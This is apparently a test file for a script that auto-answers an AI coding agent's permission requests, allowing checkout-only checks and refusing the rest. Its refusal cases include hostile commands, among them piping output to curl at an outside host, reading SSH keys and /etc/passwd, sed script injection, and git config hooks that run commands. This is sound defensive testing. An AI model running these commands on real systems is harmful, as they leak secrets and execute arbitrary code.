// What the proofs do in the inbox, as the owner would: run 6 of the
// milestone 1 proof gave up because the request the message asked for was
// not there yet, behind another request of the same session; issue 157
// (item 4) found that the proof allowed once almost every request. The
// milestone 2 proof works the inbox in the morning: permissions, then the
// plan, then the releases whose checks are green.
import test from 'node:test';
import assert from 'node:assert/strict';
import { FREE_ANSWER, answerFor, answerInInbox, chooseAnswers, declaredChecks, inboxAction, inboxGestures, insideCheckout, leftForOwner, morningAction, permissionAnswer, type InboxEntry, type InboxPage } from '../../scripts/proof-inbox.ts';

const target = 'rm -r /tmp/cleared-proof-scratch';

test('the request the message asked for is allowed once when it waits', () => {
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm test' }, { detail: `Wants to run ${target}` }], target), { kind: 'target', index: 1 });
});

test('before it comes, another request of the ticket is answered from the inbox, and the run waits', () => {
  // Run 6: only "npm test" waited when the inbox was read; the target came 5 seconds later.
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm test 2>&1 | tail -15; npm run typecheck', command: 'npm test 2>&1 | tail -15; npm run typecheck' }], target), { kind: 'other', index: 0, decision: 'allow_once' });
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm view embedded-postgres version', command: 'npm view embedded-postgres version' }], target), { kind: 'other', index: 0, decision: 'reject_once' });
  assert.deepEqual(inboxAction([], target), { kind: 'wait' });
});

test('work inside the checkout is allowed once; everything else is denied (issue 157, item 4)', () => {
  for (const command of [
    'npm test', 'npm test 2>&1 | tail -20', 'npm run typecheck; npm test', 'npm ci', 'node --test test/entries.test.ts',
    'git status', 'git diff HEAD~1 -- src/',
    'ls -la src', 'cat src/page.ts | head -50', 'grep -rn entries src test', 'sed -n 1,40p src/server.ts', 'mkdir -p test/fixtures',
    'touch test/fixtures/entries.json', 'cp README.md /workspace/notes.md', 'npm test > /dev/null 2>&1',
    'NODE_ENV=test npm test', 'cd /workspace && npm test', 'npm test &> test/out.log', 'find src -name "*.ts"', 'node --test',
  ]) assert.equal(insideCheckout(command), true, command);
  for (const command of [
    'npm install date-fns', 'npm i -D vitest', 'npm view embedded-postgres version', 'npx prettier --write .', 'curl https://example.invalid',
    'wget x', 'sudo apt-get install jq', 'pip install x', 'ssh host', 'git push origin main', 'git fetch origin', 'git config user.name x',
    'rm -r /tmp/cleared-proof-scratch', 'cat ../other/secret', 'cat ~/.ssh/id_ed25519', 'ls /etc', 'npm test > /tmp/out',
    'echo $(id) | tail', 'echo `id`', 'bash -c "npm test"', 'python3 -c "print(1)"', 'docker ps', 'env', '',
    'cp README.md /workspace/../etc/x',
    // Allowed by the first rule, refused since review 2 of PR 279: the proof never deletes, moves nor commits alone.
    'git add src/store.ts && git commit -m "Trim names"', 'rm -r test/tmp',
  ]) assert.equal(insideCheckout(command), false, command);
});

test('a second command after a newline or a single &, or one the first runs, is judged too; when unsure, denied (review 1 of PR 181, B2)', () => {
  for (const command of [
    // The review's cases: allowed once by the first version of the rule.
    'ls\ncurl http://x.io/a', 'ls & curl http://x.io', 'find . -exec curl http://x.io {} +',
    // Other ways to start a program the checkout does not hold.
    'npm test &', 'ls\r\nwget x', 'find . -execdir sh -c x {} +', 'find . -ok rm {} ;', 'find . -delete',
    'cat <(curl http://x.io)', 'npm test > >(curl -d @- http://x.io)', 'node -e "fetch(1)"', 'node --eval x', 'node -p 1',
    'node --require ./x.js test/a.ts', 'node --import x test/a.ts', 'node test/a.ts', 'awk \'BEGIN{system("curl x")}\' f', 'sed -i "1e curl x" f', 'sed "1e id" f',
    'NODE_OPTIONS=--require=./x.js npm test', 'PATH=/tmp/bin:$PATH npm test', 'npx prettier --write .', 'npx tsc', 'git -c core.pager=curl log',
    'xargs curl < urls.txt', 'env curl x', 'timeout 5 curl x', 'nohup curl x', 'echo a; python3 -c 1',
    // The names the first rule denied anywhere, kept as a second check on the whole text.
    'echo "run: curl http://x.io"', 'grep -r wget src', 'npm run build -- --registry=x && npm install x',
  ]) assert.equal(insideCheckout(command), false, JSON.stringify(command));
  assert.equal(answerFor('npm test'), 'allow_once');
  assert.equal(answerFor('npm install x'), 'reject_once');
});

const release = (id: string, checks: 'pending' | 'passed' | 'failed', ticket = 'LOCAL-1'): InboxEntry => ({ id, kind: 'release', ticket, checks });

test('in the morning: permissions first, then the plan, then releases whose checks passed, oldest first', () => {
  const entries: InboxEntry[] = [
    release('release:1', 'passed'),
    { id: 'permission:s1:r1', kind: 'permission', ticket: 'LOCAL-2', command: 'npm view x' },
    { id: 'plan:p1', kind: 'plan', ticket: 'lead' },
  ];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), { kind: 'permission', id: 'permission:s1:r1', decision: 'reject_once' });
  assert.deepEqual(morningAction(entries.slice(0, 1).concat(entries.slice(2)), { releases: true, plan: true }), { kind: 'plan', id: 'plan:p1' });
  assert.deepEqual(morningAction([release('release:1', 'pending'), release('release:2', 'passed', 'LOCAL-2')], { releases: true, plan: true }), { kind: 'release', id: 'release:2' });
});

test('what the morning leaves: pending or failed checks, questions, and the releases the owner approves', () => {
  assert.deepEqual(morningAction([release('release:1', 'pending')], { releases: true, plan: true }), { kind: 'wait', left: ['release:1 (checks pending)'] });
  assert.deepEqual(morningAction([release('release:1', 'failed')], { releases: true, plan: true }), { kind: 'wait', left: ['release:1 (checks failed)'] });
  assert.deepEqual(morningAction([{ id: 'question:s1:q1', kind: 'question', ticket: 'LOCAL-3' }], { releases: true, plan: true }), { kind: 'wait', left: ['question:s1:q1 (a question, for the owner)'] });
  // PROOF_OWNER_APPROVES=1: the owner approves the releases; the proof still answers nothing else for them.
  assert.deepEqual(morningAction([release('release:1', 'passed')], { releases: false, plan: true }), { kind: 'wait', left: ['release:1 (the owner approves)'] });
  assert.deepEqual(morningAction([{ id: 'plan:p1', kind: 'plan', ticket: 'lead' }], { releases: true, plan: false }), { kind: 'wait', left: ['plan:p1 (the owner approves)'] });
  assert.deepEqual(morningAction([], { releases: true, plan: true }), { kind: 'wait', left: [] });
});

// Lane 29: the kinds of the replanned milestone 2 in the morning rule.
const sessionPlan = (id: string, confidence: 'low' | 'medium' | 'high', ticket = 'LOCAL-4'): InboxEntry => ({ id, kind: 'session_plan', ticket, session: `s-${id}`, confidence });

test('a session plan that waits gets its Go in the morning, after the permissions and before the plan and the releases (lane 29)', () => {
  // A medium or low confidence holds its ticket until the morning; step 7 would wait for it forever.
  const entries: InboxEntry[] = [release('release:1', 'passed'), sessionPlan('session_plan:s4', 'medium'), { id: 'plan:p1', kind: 'plan', ticket: 'lead' }];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), { kind: 'session_plan', id: 'session_plan:s4', session: 's-session_plan:s4' });
  assert.deepEqual(morningAction([{ id: 'permission:s1:r1', kind: 'permission', ticket: 'LOCAL-2', command: 'npm test' }, ...entries], { releases: true, plan: true }).kind, 'permission');
  // The owner who approves in the morning gives the Go too.
  assert.deepEqual(morningAction([sessionPlan('session_plan:s4', 'low')], { releases: false, plan: false }), { kind: 'wait', left: ['session_plan:s4 (the owner approves)'] });
});

test('a knowledge item is left to the owner and a contract item to the multi-service proof: neither is answered in the morning (lane 29)', () => {
  const entries: InboxEntry[] = [
    { id: 'knowledge:k1', kind: 'knowledge', ticket: 'LOCAL-2' },
    { id: 'contract:c1', kind: 'contract', ticket: 'LOCAL-9' },
    release('release:1', 'pending'),
  ];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), {
    kind: 'wait',
    left: ['knowledge:k1 (knowledge, for the owner)', 'contract:c1 (a contract, validated in the multi-service proof only)', 'release:1 (checks pending)'],
  });
  // They do not hold the releases back.
  assert.deepEqual(morningAction([...entries.slice(0, 2), release('release:2', 'passed')], { releases: true, plan: true }), { kind: 'release', id: 'release:2' });
  assert.deepEqual(leftForOwner([...entries, { id: 'knowledge:k2', kind: 'knowledge', ticket: 'LOCAL-3' }]), { knowledge: 2, contract: 1 });
});

test('a session\'s question: the option marked recommended, else the first; one option of a multiple choice; a fixed free answer when there is no option', () => {
  assert.deepEqual(chooseAnswers([
    { question: 'Offsets from 0 or 1?', header: 'Offsets', options: [{ label: 'From 1' }, { label: 'From 0 (Recommended)', description: 'As indexOf answers.' }] },
    { question: 'Which name for the column?', options: [{ label: 'held' }, { label: 'on_hold' }] },
    { question: 'Which states to show?', multiSelect: true, options: [{ label: 'Held' }, { label: 'Refused (recommended)' }, { label: 'Shown' }] },
    { question: 'Anything else the owner wants?' },
  ]), [
    { question: 'Offsets from 0 or 1?', options: ['From 1', 'From 0 (Recommended)'], answer: 'From 0 (Recommended)', how: 'recommended' },
    { question: 'Which name for the column?', options: ['held', 'on_hold'], answer: 'held', how: 'first' },
    { question: 'Which states to show?', options: ['Held', 'Refused (recommended)', 'Shown'], answer: 'Refused (recommended)', how: 'recommended' },
    { question: 'Anything else the owner wants?', options: [], answer: FREE_ANSWER, how: 'free' },
  ]);
  // The label is sent back as written, "(Recommended)" kept, as the inbox's button carries it.
  assert.equal(chooseAnswers([{ question: 'q', options: [{ label: 'A' }, { label: 'B (Recommended)' }] }])[0]?.answer, 'B (Recommended)');
  assert.deepEqual(chooseAnswers([]), []);
  assert.deepEqual(chooseAnswers([{ question: 'q', options: [] }])[0]?.how, 'free');
});

// Issue #269: a team's question in the inbox, answered by the proofs.
test('the milestone 2 morning answers a team\'s question after the permissions when told to, never the lead\'s', () => {
  const question: InboxEntry = { id: 'question:s1:q1', kind: 'question', ticket: 'LOCAL-3' };
  const lead: InboxEntry = { id: 'question:lead-1:lq', kind: 'question', ticket: 'lead' };
  const permission: InboxEntry = { id: 'permission:s1:r1', kind: 'permission', ticket: 'LOCAL-3', command: 'ls' };
  assert.deepEqual(morningAction([question], { releases: true, plan: true, questions: true }), { kind: 'question', id: 'question:s1:q1' });
  assert.equal(morningAction([question, permission], { releases: true, plan: true, questions: true }).kind, 'permission', 'a permission first');
  assert.deepEqual(morningAction([lead], { releases: true, plan: true, questions: true }), { kind: 'wait', left: ['question:lead-1:lq (a question, for the owner)'] });
  assert.deepEqual(morningAction([question], { releases: true, plan: true }), { kind: 'wait', left: ['question:s1:q1 (a question, for the owner)'] }, 'the owner\'s unless told');
});

test('the inbox\'s gestures: one click on the only choice of one question, else each pick or free answer, then Send', () => {
  const one = [{ question: 'Which database?', options: [{ label: 'Postgres (Recommended)' }, { label: 'SQLite' }] }];
  assert.deepEqual(inboxGestures(one, chooseAnswers(one)), { gestures: [{ kind: 'option', index: 0, label: 'Postgres (Recommended)' }], send: false });
  const multi = [{ question: 'Which checks?', multiSelect: true, options: [{ label: 'test' }, { label: 'lint' }] }];
  assert.deepEqual(inboxGestures(multi, chooseAnswers(multi)), { gestures: [{ kind: 'option', index: 0, label: 'test' }], send: true });
  const free = [{ question: 'What should the empty page say?' }];
  assert.deepEqual(inboxGestures(free, chooseAnswers(free)), { gestures: [{ kind: 'free', index: 0, text: FREE_ANSWER }], send: true });
  const two = [...one, ...free];
  assert.deepEqual(inboxGestures(two, chooseAnswers(two)).send, true);
});

test('answerInInbox clicks the option by its data-answer read back, and Send only when a click does not answer', async () => {
  const done: string[] = [];
  const page = (labels: string[]): InboxPage => ({
    locator: (selector) => {
      const at = (nth?: number) => ({
        fill: async (text: string) => { done.push(`fill ${selector} ${text}`); },
        click: async () => { done.push(`click ${selector}${nth === undefined ? '' : ` #${nth}`}`); },
        nth: (index: number) => at(index),
        evaluateAll: async <T>(run: (nodes: { getAttribute(name: string): string | null }[]) => T) => run(labels.map((label) => ({ getAttribute: () => label }))),
      });
      return at();
    },
  });
  const one = [{ question: 'Which database?', options: [{ label: 'SQLite' }, { label: 'Postgres (Recommended)' }] }];
  assert.deepEqual((await answerInInbox(page(['SQLite', 'Postgres (Recommended)']), one)).map((c) => c.answer), ['Postgres (Recommended)']);
  assert.deepEqual(done, ['click #detail [data-q="0"][data-answer] #1']);
  done.length = 0;
  await answerInInbox(page([]), [{ question: 'What should the empty page say?' }]);
  assert.deepEqual(done, [`fill #detail [data-free="0"] ${FREE_ANSWER}`, 'click #detail [data-act="answer"]']);
  await assert.rejects(answerInInbox(page(['Other']), one), /shows no option "Postgres \(Recommended\)"/);
});

// Run 5 of the multi-service proof, step 10: the reviewer's requests to run
// the service's checks were denied, it judged on the diff alone, and the
// ticket went back to Todo.
const PACKAGE = JSON.stringify({ scripts: { test: 'node --test', typecheck: 'tsc --noEmit', lint: 'eslint .', build: 'tsc' } });
const checks = declaredChecks(PACKAGE);

test('the declared checks: test, typecheck and lint among the scripts of package.json, as commands; none when unreadable', () => {
  assert.deepEqual(checks, ['npm test', 'npm run typecheck', 'npm run lint']);
  assert.deepEqual(declaredChecks(JSON.stringify({ scripts: { test: 'node --test', start: 'node src/server.ts' } })), ['npm test']);
  for (const text of [undefined, '', '{', '{"scripts": null}', '{"scripts": "npm test"}', '{"name": "x"}']) assert.deepEqual(declaredChecks(text), [], String(text));
});

test('an author or a reviewer asking to run exactly one of its service\'s declared checks is allowed once', () => {
  for (const role of ['reviewer', 'author']) {
    for (const command of ['npm test', 'npm run typecheck', 'npm run lint', '  npm  run typecheck ']) {
      assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'allow_once', rule: 'check' }, `${role}: ${command}`);
    }
  }
  // A script the service does not declare is no check: the checkout rule answers.
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run lint', checks: ['npm test'] }), { decision: 'allow_once', rule: 'checkout' });
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run build', checks }), { decision: 'allow_once', rule: 'checkout' });
});

test('a write outside the checkout, the network or an install keeps being refused, whatever the role', () => {
  for (const role of ['reviewer', 'author', undefined]) {
    for (const command of [
      'npm install x', 'npm i -D vitest', 'curl -s -m 5 -X POST http://filter-api:8080/check', 'npm test > /tmp/out', 'cat > /tmp/t.mts <<\'E\'\nimport x\nE',
      'npm test; curl http://x.io', 'npm test && git push origin main', 'npm run typecheck | curl -d @- http://x.io',
      // Run 5's first request of the reviewer: a check, then a file written outside the checkout.
      'git log --oneline origin/proof-run..HEAD; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<\'E\'\nimport {findWords} from \'/workspace/src/words.ts\'\nE',
    ]) assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'reject_once', rule: 'refused' }, `${role}: ${command}`);
  }
  // A request that is not a command (an edit outside, a fetch) is denied.
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: undefined, checks }), { decision: 'reject_once', rule: 'not_a_command' });
});

test('a role other than author or reviewer, or one the proof could not read, gets the checkout rule\'s answer', () => {
  for (const role of ['lead', 'reader', 'owner', '', undefined]) {
    assert.deepEqual(permissionAnswer({ role, command: 'npm test', checks }), { decision: 'allow_once', rule: 'checkout' }, String(role));
    assert.deepEqual(permissionAnswer({ role, command: 'npm install x', checks }), { decision: 'reject_once', rule: 'refused' }, String(role));
  }
  // The rule above is unchanged for the other proofs.
  assert.equal(answerFor('npm test'), 'allow_once');
  assert.equal(answerFor('npm install x'), 'reject_once');
});

test('everything but a declared check keeps the checkout rule\'s answer, run 5\'s requests among them', () => {
  for (const command of [
    'npm test', 'npm test 2>&1 | tail -20', 'npm run typecheck; npm test', 'npm ci', 'git status', 'ls -la src', 'npm install date-fns', 'curl https://example.invalid',
    'git push origin main', 'cat ~/.ssh/id_ed25519', 'npm test > /tmp/out', 'echo $(id) | tail', 'node -e "fetch(1)"', '',
    // Run 5's second request of the reviewer: checks and reads, refused by the split that does not read quotes (decisions log of 2026-10-23).
    'npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; git ls-files; grep -rn "findWords\\|words:" --include=* -r src README.md | grep -v "^src/words.ts" | head',
    'git cherry-pick -n 7a17274 && git status --short', 'getent hosts filter-api postgres', 'FILTER_URL=http://filter-api:8795 npm test',
  ]) {
    for (const role of ['reviewer', 'author', 'lead', undefined]) assert.equal(permissionAnswer({ role, command, checks }).decision, answerFor(command), `${role}: ${command}`);
  }
});

// The reviewer's requests the proof refused, as the ledger keeps them (run 5
// and the runs before it): review 1 of PR 279, followup 1. Each is read by
// the service's parser (parseList), never split as a string.
const RUN5_REVIEWER_READS = 'npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; git ls-files; grep -rn "findWords\\|words:" --include=* -r src README.md | grep -v "^src/words.ts" | head';
const RUN5_REVIEWER_SCRATCH = `git log --oneline origin/proof-run..HEAD; git diff origin/proof-run...HEAD --stat; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<'E'
import {findWords,parseWords} from '/workspace/src/words.ts';
const l=parseWords('spam\\n');
for (const t of ['spaḿ','spam​','xspaḿ spam']) console.log(JSON.stringify(t),findWords(l,t));
E
node /tmp/t.mts; git stash list; git show proof-run:src/words.ts >/dev/null 2>&1; git show origin/proof-run:src/words.ts | tail -8`;
const EARLIER_REVIEWER_SCRATCH = `cd /tmp && cat > t.ts <<'E'
import { findWords, parseWords } from '/workspace/src/words.ts';
const l = parseWords('οδός\\nσ\\n');
console.log(findWords(l,'ΟΔΟΣ'), findWords(parseWords('aς\\n'),'aΣ'));
E
node t.ts; cd /workspace; git diff origin/main...HEAD --stat | tail -2`;
const EARLIER_REVIEWER_VARIABLE = 'echo "${DATABASE_URL:+set}"; npm run typecheck 2>&1 | tail -5; git diff main...HEAD -- test/consumer.test.ts | grep -n "^+.*it(\\|^+.*test(" ';

test('the common forms of a check, read by the parser, are allowed once: run 5\'s reviewer reads among them (review 1 of PR 279, followup 1)', () => {
  for (const command of [
    RUN5_REVIEWER_READS,
    // An author's of an earlier run: a quoted pattern holding | and parentheses.
    'cd /workspace; npm test 2>&1 | grep -E "^ℹ (tests|pass|fail)"; npm run typecheck >/dev/null 2>&1 && echo typecheck ok; git status --short',
    'cd services/api && npm test', 'cd /workspace/services/api && npm test 2>&1 | tail -20',
    'npm test -- --test-name-pattern="filter API"', 'npm test -- -t "filter API" test/words.test.ts', 'npm run test -- --reporter=dot',
    'npx tsc --noEmit', 'npx tsc --noEmit -p app', 'npx --no-install tsc --noEmit --pretty', 'npm run typecheck 2>&1 | tail -5 && npx tsc --noEmit -p app/web',
    'git ls-files', 'git ls-files | wc -l', 'grep -rn "a\\|b" --include=*.ts src', 'ls *', 'wc -l *.md',
  ]) assert.equal(answerFor(command), 'allow_once', command);
});

test('everything else stays refused: a scratch file outside the checkout, an expansion, a variable, an option that loads or writes elsewhere', () => {
  for (const command of [
    RUN5_REVIEWER_SCRATCH, EARLIER_REVIEWER_SCRATCH, EARLIER_REVIEWER_VARIABLE,
    // Run 5's authors, refused before and still.
    'FILTER_URL=http://filter-api:8795 npm test -- --test-name-pattern="filter API" 2>&1 | grep -E "integration|filter API|^ℹ|✖|Error|error" | head -30',
    '(npm ls >/dev/null 2>&1 || npm ci >/dev/null 2>&1); npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; sed -n 95,125p src/server.ts',
    'git cherry-pick -n f24fe1b && git diff --stat && npm test 2>&1 | tail -25', 'getent hosts filter-api postgres',
    // cd: only into the checkout, never home (cd alone) nor back (cd -), nor up a glob.
    'cd && cat .ssh/id_ed25519', 'cd - && ls', 'cd /tmp && npm test', 'cd .. && npm test', 'cd ".."* && ls', 'cat .*/x', 'ls src/*/../..',
    // npm: its own options from a list, the runner's after -- too; nothing that loads a module or names a shell.
    'npm test --script-shell=/bin/sh', 'npm test -- --require=./x.js', 'npm test -- --import=data:text/javascript,1', 'npm test -- -r ./x.js',
    'npm ci -- x', 'npm run "a b"', 'npm test -- --test-reporter-destination=/tmp/out',
    // npx: tsc alone, --noEmit required, its project inside.
    'npx tsc', 'npx tsc --outDir /tmp/x', 'npx tsc --noEmit -p /etc', 'npx tsc --noEmit --plugin x', 'npx eslint .', 'npx -y tsc --noEmit',
    // git: an output elsewhere, a write to the remote.
    'git diff --output=/tmp/x', 'git log --output /tmp/x', 'git stash list', 'git push origin proof-run',
    // What the parser refuses.
    'npm test\nnpm run typecheck', 'npm test <<E\nx\nE', 'cat < /etc/passwd', 'echo "$HOME"', "echo 'a", 'npm test |& tail', 'ls {a,/etc}',
  ]) assert.equal(answerFor(command), 'reject_once', JSON.stringify(command));
});

// Review 2 of PR 279: the parser made a quoted word one word, which a
// program may read as a script of its own. Each program below is allowed
// only with its options from a list.
test('sed prints lines only: a script that is exactly one range, else refused (review 2 of PR 279, blocking 1)', () => {
  for (const command of ['sed -n 1,40p src/server.ts', 'sed -n 12p README.md test/a.ts', "sed -n '45,56p' test/words.test.ts", 'sed 1p -n README.md']) assert.equal(answerFor(command), 'allow_once', command);
  for (const command of [
    // The review's two: GNU sed reads the first word as its script, so w wrote the file and e ran the command.
    "sed -n 'w /tmp/pwn' 1p README.md", "sed -n 'e id' 1p README.md",
    "sed -n 'w out.txt' 1p README.md", "sed -n '1p;w x' README.md", "sed -n '1e id' README.md", "sed -n '1p' -e 'w x' README.md",
    'sed -n README.md 1p', 'sed 1p README.md', 'sed -n -i 1p README.md', 'sed -n --expression=1p README.md', 'sed -n -f script.sed README.md', 'sed -n 1,40d README.md',
    'sed -n 1p -s README.md', 'sed -n',
  ]) assert.equal(answerFor(command), 'reject_once', command);
});

test('sort, rg: no option that runs another program (review 2 of PR 279, followup 1)', () => {
  for (const command of ['sort README.md', 'sort -rn counts.txt | head', 'sort -t , -k 2 data.csv', 'sort -k2,2n -u data.txt', 'sort --numeric-sort --reverse x.txt',
    'rg -n findWords src', 'rg --type ts -l "words:" src', 'grep -rn x src | sort | uniq -c', 'rg -nw -C2 --glob=*.ts findWords src', 'rg -e a -e b -t ts src']) assert.equal(answerFor(command), 'allow_once', command);
  for (const command of [
    'sort --compress-program=sh -S 1 README.md', 'sort --compress-program sh README.md', 'sort --compress=sh README.md', 'sort -S 1 README.md', 'sort -o out.txt README.md',
    'sort -T tmp README.md', 'sort --output=out.txt README.md', 'sort --files0-from=list README.md',
    'rg --pre sh x README.md', 'rg --pre=sh x README.md', 'rg --pre-glob "*" --pre sh x src', 'rg -z x src', 'rg --search-zip x src', 'rg -nz x src',
    // ripgrep 14 runs --hostname-bin; and any option not in rg's list.
    'rg --hostname-bin=sh x src', 'rg --hostname-bin sh x src', 'rg --replace=x y src', 'rg --json x src', 'rg -P x src',
  ]) assert.equal(answerFor(command), 'reject_once', command);
});

test('git: the read-only subcommands only, each with its options from a list (review 2 of PR 279, followup 2)', () => {
  for (const command of [
    'git status --short', 'git status -sb', 'git diff --stat', 'git diff origin/proof-run...HEAD --stat', 'git diff --cached -- src/words.ts', 'git diff -U5 HEAD~1',
    'git log --oneline -3 origin/main', 'git log --oneline origin/proof-run..HEAD', "git log -1 --format='%H %s%n%b' 0d7fbb5", 'git log -n5 --stat -- src',
    'git show --stat cc88a03', 'git show origin/proof-run:src/words.ts | tail -8', 'git ls-files', 'git ls-files --others --exclude-standard', 'git branch --show-current', 'git branch -a',
  ]) assert.equal(answerFor(command), 'allow_once', command);
  for (const command of [
    'git diff --output=x', 'git diff --output=*', 'git diff --output x', 'git log -p --ext-diff', 'git show --textconv x', 'git diff --no-index a b',
    'git branch -D main', 'git branch -m x', 'git branch new-branch', 'git restore --source=HEAD~5 .', 'git commit --amend --no-verify', 'git commit -m x',
    'git add .', 'git rm x', 'git mv a b', 'git push origin proof-run', 'git stash', 'git checkout x', 'git reset --hard', 'git -c core.pager=less log',
    'git -C /tmp status', 'git log --exec=x', 'git diff --color-moved=x --ext-diff', 'git', 'git log --output=/tmp/x',
  ]) assert.equal(answerFor(command), 'reject_once', command);
});

test('rm and mv are never allowed alone; a reporter is a built-in name, never a path (review 2 of PR 279)', () => {
  for (const command of ['rm x', 'rm -rf *', 'rm -r test/tmp', 'mv * x', 'mv a b', 'npm test && rm -rf dist']) assert.equal(answerFor(command), 'reject_once', command);
  for (const command of ['npm test -- --test-reporter=dot', 'npm test -- --test-reporter dot test/a.ts', 'npm run test -- --reporter=verbose', 'npm test -- --reporter tap']) {
    assert.equal(answerFor(command), 'allow_once', command);
  }
  for (const command of [
    'npm test -- --test-reporter=./x.js', 'npm test -- --test-reporter ./x.js', 'npm test -- --test-reporter=/workspace/x.mjs', 'npm run test -- --reporter=./r.ts',
    'npm test -- --reporter', 'npm test -- --test-reporter-destination=out.txt',
    'node --test --test-reporter=./x.js test/a.ts', 'node --test --test-reporter ./x.js', 'node --test --test-reporter=dot test/a.ts',
  ]) assert.equal(answerFor(command), 'reject_once', command);
});

test('a quoted word holding spaces: each piece is read as a path too (review 2 of PR 279)', () => {
  for (const command of ['grep -rn "a /etc/passwd" src', 'cat "x ../y"', 'echo "see ~/notes"']) assert.equal(answerFor(command), 'reject_once', command);
  for (const command of ['grep -rn "filter API" src', 'echo "typecheck ok"']) assert.equal(answerFor(command), 'allow_once', command);
});

test('nothing under .git: git reads its config there and runs what it names (review 2 of PR 279)', () => {
  for (const command of [
    // A plain git diff runs diff.external; git status runs core.fsmonitor.
    "echo '[diff]' >> .git/config; echo '  external = id' >> .git/config; git diff",
    "printf '[core]\\n\\tfsmonitor = id\\n' >> .git/config && git status",
    'cp x .git/config', 'mkdir .git/hooks', 'cd .git && ls', 'cp --target-directory=.git x', 'cat .git/config', 'touch ./.git/hooks/pre-commit',
    'cp x /workspace/.git/config', 'echo x > services/api/.git/config',
  ]) assert.equal(answerFor(command), 'reject_once', command);
  for (const command of ['cat .gitignore', 'ls .github/workflows', 'git show HEAD:.gitignore', 'cat .github/workflows/checks.yml | head']) assert.equal(answerFor(command), 'allow_once', command);
});
